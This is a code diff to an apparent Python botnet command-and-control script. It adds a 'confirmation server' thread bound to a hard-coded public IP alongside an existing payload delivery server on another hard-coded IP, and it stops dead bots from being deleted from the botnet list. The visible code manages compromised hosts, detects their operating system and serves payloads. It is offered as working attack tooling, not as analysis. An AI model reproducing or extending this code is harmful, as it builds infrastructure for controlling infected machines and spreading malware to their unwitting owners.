@@ -20,6 +20,14 @@ test_bool = False
 #            return True
 #    return False
 
+def start_confirmation_server(ip="159.65.11.28",port=2000):
+    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+    s.bind((ip,port))
+    s.listen(5)
+    while True:
+        client,addr = s.accept()
+
+
 def start_payload_delivery_server(port=2004,ip="142.93.158.189"):
     global payload_name
     ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
@@ -86,7 +94,7 @@ def test_bots():
         global test_bool
         if(test_bool == False):
             print("[*] %s : Dead"%(bot))
-            del botnet[bot]
+            #del botnet[bot]
 
 def detect_os():
     global botnet
@@ -130,7 +138,7 @@ def update_botnet():
                 global test_bool
                 if(test_bool == False):
                     print("[*] %s : Connection dead"%(bot))
-                    del botnet[bot]
+                    #del botnet[bot]
                 else:
                     pass
         except socket.error:
@@ -319,6 +327,8 @@ def main():
     try:
         listener_thread = Thread(target=start_server,args=())
         listener_thread.start()
+        confrimation_server_thread = Thread(target=start_confirmation_server,args=())
+        confrimation_server_thread.start()
         if(len(sys.argv) > 1):
             payload_delivery_thread = Thread(target=start_payload_delivery_server,args=())
             payload_delivery_thread.start()
